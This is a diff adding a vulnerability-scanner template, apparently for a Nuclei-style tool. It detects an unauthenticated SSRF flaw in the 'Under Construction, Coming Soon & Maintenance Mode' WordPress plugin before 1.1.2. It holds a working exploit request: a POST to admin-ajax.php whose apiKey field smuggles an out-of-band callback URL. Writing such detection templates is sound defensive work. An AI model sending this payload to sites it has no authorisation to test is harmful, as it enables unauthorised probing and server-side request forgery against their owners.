@@ -1,0 +1,36 @@
+id: wp-under-construction-ssrf
+brief:
+    title: Under Construction, Coming Soon & Maintenance Mode < 1.1.2 - Server Side Request Forgery (SSRF)
+    by: Akincibor
+    level: high
+    about: The includes/mc-get_lists.php file used the 'apiKey' POST parameter to create an https URL from it without sanitisation and called it with cURL, leading to a SSRF issue. The issue is exploitable vi...
+    label:
+        - ssrf
+        - wp
+        - wp-plugin
+        - wordpress
+        - unauth
+        - wpscan
+        - packetstorm
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/under-construction-maintenance-mode/readme.txt'
+      signs:
+        - "on": word
+          has:
+            - = Under Construction
+          in: body
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-admin/admin-ajax.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Origin: '{{BaseURL}}'
+      body: action=ucmm_mc_api&apiKey=-{{interactsh-url}}%2Ftest%2Ftest%2Ftest%3Fkey1%3Dval1%26dummy%3D
+      signs:
+        - "on": word
+          has:
+            - http
+          in: interactsh_protocol
